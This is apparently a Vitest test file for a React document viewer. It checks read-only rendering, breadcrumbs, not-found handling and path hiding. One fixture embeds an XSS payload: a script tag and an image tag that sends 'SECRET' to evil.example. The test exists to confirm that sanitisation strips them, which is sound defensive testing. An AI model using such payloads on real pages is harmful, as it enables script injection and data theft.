// @vitest-environment jsdom
import { act } from 'react';
import { afterEach, beforeEach, describe, test, vi } from 'vitest';
import { assert } from 'riteway/vitest';
import { ImagoSWRProvider } from '@/api/swr-provider';
import { RealtimeProvider } from '@/realtime/realtime-provider';
import type { RealtimeClient, RealtimeSocket } from '@/realtime/realtime-client';
import { mount, unmountAll } from '../../test-support/dom';
import { fakeWeb, type FakeRoute } from '../../test-support/fake-web';
import { createInitialState } from '../../store/state';
import { setUiState } from '../../store/store';
import { pageRow, treeRow } from '../file-model/fixtures';
import { documentBodyClass, documentColumnClass } from './document-view-class';

const router = vi.hoisted(() => ({ pushed: [] as string[] }));
vi.mock('next/navigation', () => ({
  useRouter: () => ({ push: (href: string) => router.pushed.push(href) }),
}));

// The route itself is a server component (it awaits the viewer); these are
// exactly what it renders into the object slot.
const { PageObject } = await import('../page-object/page-object');
const { LegacyDocumentObject: PageView } = await import('../../test-support/legacy-document-object');

beforeEach(() => {
  setUiState(createInitialState());
  router.pushed = [];
});

afterEach(unmountAll);

const settle = async (check: () => void): Promise<void> => {
  for (let tries = 0; tries < 100; tries += 1) {
    await act(async () => {
      await new Promise((resolve) => setTimeout(resolve, 10));
    });
    try {
      check();
      return;
    } catch {
      // Not yet: flush again.
    }
  }
  check();
};

const quietRealtime = (): RealtimeClient => {
  const socket: RealtimeSocket = {
    connected: true,
    emit: () => socket,
    on: () => socket,
    off: () => socket,
    connect: () => socket,
    disconnect: () => socket,
  };
  return { socket: () => socket, disconnect: () => {} };
};

const PAGE = 'GET /api/pages/notes';
const TREE = 'GET /api/drives/d1/pages';

const NOTES_HTML =
  '<h2>Why</h2><p>Ship <strong>in October</strong>.</p><img src="https://evil.example/p.png?d=SECRET"><script>alert(1)</script>';

const notes = (overrides: Record<string, unknown> = {}): FakeRoute => () =>
  Response.json({
    ...pageRow('notes', 'DOCUMENT', { parentId: 'brief', title: 'Notes' }),
    content: NOTES_HTML,
    children: [],
    messages: [],
    ...overrides,
  });

/** Drive d1: Launch (folder) › Brief (doc) › Notes (doc). */
const tree: FakeRoute = () =>
  Response.json([
    treeRow('launch', 'FOLDER', [
      treeRow('brief', 'DOCUMENT', [treeRow('notes', 'DOCUMENT', [], { parentId: 'brief', title: 'Notes' })], {
        parentId: 'launch',
        title: 'Brief',
      }),
    ], { title: 'Launch' }),
  ]);

/** These viewers may read the page but not edit it (editing: document-edit.test.tsx). */
const readOnly: FakeRoute = () => Response.json({ canView: true, canEdit: false, canShare: false, canDelete: false });

const show = (routes: Record<string, FakeRoute>, pageId = 'notes') => {
  const web = fakeWeb({ [`GET /api/pages/${pageId}/permissions/check`]: readOnly, ...routes });
  const container = mount(
    <ImagoSWRProvider client={web.client}>
      <RealtimeProvider client={quietRealtime()}>
        <PageObject driveId="d1" pageId={pageId}>
          <PageView driveId="d1" pageId={pageId} />
        </PageObject>
      </RealtimeProvider>
    </ImagoSWRProvider>,
  );
  return { web, container };
};

const body = (container: HTMLElement) => container.querySelector('[data-document-body]');

describe('a DOCUMENT in the Files object', () => {
  test('its content, read-only, in the reading column', async () => {
    const { container, web } = show({ [PAGE]: notes(), [TREE]: tree });
    await settle(() => {
      if (!body(container)?.querySelector('h2')) throw new Error('no content yet');
    });
    const content = body(container) as HTMLElement;
    assert({
      given: 'a document page the viewer can open in this drive',
      should: 'draw its stored content through the document schema, not editable, inside the centred reading column',
      actual: [
        content.querySelector('h2')?.textContent,
        content.querySelector('strong')?.textContent,
        content.getAttribute('contenteditable'),
        content.className.includes(documentBodyClass),
        content.closest('[data-reading-column]')?.className,
        container.querySelector('img, script, [src]'),
        container.querySelector('[data-object-placeholder]'),
        web.count(PAGE),
      ],
      expected: ['Why', 'in October', 'false', true, documentColumnClass, null, null, 1],
    });
  });

  test('its header', async () => {
    const { container } = show({ [PAGE]: notes(), [TREE]: tree });
    await settle(() => {
      if (container.querySelectorAll('nav[aria-label="Page path"] a').length < 2) throw new Error('no path yet');
    });
    const header = container.querySelector('header');
    const nav = header?.querySelector('nav[aria-label="Page path"]');
    assert({
      given: 'a document two pages down its drive',
      should: 'show its breadcrumbs in the pane header, each page above it a link, then its title',
      actual: [
        [...(nav?.querySelectorAll('a') ?? [])].map((link) => [link.textContent, link.getAttribute('href')]),
        nav?.querySelector('[aria-current="page"]')?.textContent,
        container.querySelector('[data-reading-column] h1')?.textContent,
      ],
      expected: [[['Launch', '/d1/files/launch'], ['Brief', '/d1/files/brief']], 'Notes', 'Notes'],
    });
  });

  test('a page the viewer cannot view', async () => {
    const cases: readonly [string, FakeRoute][] = [
      ['403', () => Response.json({ error: 'You do not have permission to view this page' }, { status: 403 })],
      ['404', () => Response.json({ error: 'Page not found' }, { status: 404 })],
    ];
    const actual: unknown[] = [];
    for (const [name, route] of cases) {
      const { container } = show({ [PAGE]: route, [TREE]: tree });
      await settle(() => {
        if (!container.querySelector('[data-not-found]')) throw new Error(`${name}: no not-found`);
      });
      actual.push([
        name,
        container.querySelector('[data-not-found] h2')?.textContent,
        container.querySelector('[data-document], [data-document-body], nav[aria-label="Page path"]'),
        container.textContent?.includes('permission'),
      ]);
      unmountAll();
    }
    assert({
      given: 'a page the server refuses (403) or does not know (404)',
      should: 'render not-found, the same for both, with no document, path or server text',
      actual,
      expected: [
        ['403', 'Page not found', null, false],
        ['404', 'Page not found', null, false],
      ],
    });
  });

  test('a page of another type', async () => {
    const { container } = show({
      [PAGE]: notes({ type: 'SHEET', title: 'Budget' }),
      [TREE]: tree,
    });
    await settle(() => {
      if (!container.querySelector('[data-object-placeholder]')) throw new Error('no placeholder');
    });
    assert({
      given: 'a page that is not a document',
      should: 'not draw it as a document',
      actual: container.querySelector('[data-document]'),
      expected: null,
    });
  });

  test('before the tree loads, and an untitled page', async () => {
    const { container } = show({
      [PAGE]: notes({ title: '  ' }),
      [TREE]: () => new Promise<Response>(() => {}),
    });
    await settle(() => {
      if (!container.querySelector('[data-document]')) throw new Error('no document');
    });
    const nav = container.querySelector('nav[aria-label="Page path"]');
    assert({
      given: 'an untitled document while the drive tree is still on its way',
      should: 'name it Untitled and show no path above it yet',
      actual: [nav?.querySelectorAll('a').length, nav?.textContent, container.querySelector('h1')?.textContent],
      expected: [0, 'Untitled', 'Untitled'],
    });
  });
});

describe('crumbsFor()', () => {
  test('a page a children load names but the drive tree does not list', async () => {
    const { composeTree } = await import('../file-tree/file-tree');
    const { fileNodesFrom } = await import('../file-model/from-api');
    const { listedIdsFrom } = await import('../tree-view/tree-view');
    const { crumbsFor } = await import('./document-view');
    const pages = [
      treeRow('launch', 'FOLDER', [treeRow('brief', 'DOCUMENT', [], { parentId: 'launch', title: 'Brief' })], {
        title: 'Launch',
      }),
    ];
    // Brief expanded: apps/web's children route checks only the parent, so it can name Secret.
    const nodes = fileNodesFrom(
      composeTree(
        { pages, at: 1 },
        {
          brief: { children: [pageRow('secret', 'FOLDER', { parentId: 'brief', title: 'Secret' })], at: 2 },
          secret: { children: [pageRow('notes', 'DOCUMENT', { parentId: 'secret', title: 'Notes' })], at: 3 },
        },
      ),
    );
    const listed = listedIdsFrom(pages);
    assert({
      given: 'a document reached in the loaded tree only through a page the drive tree does not list',
      should: 'never name that page in the path',
      actual: [crumbsFor(nodes, listed, 'notes'), crumbsFor(nodes, listed, 'brief')],
      expected: [[], [{ id: 'launch', title: 'Launch' }]],
    });
  });
});
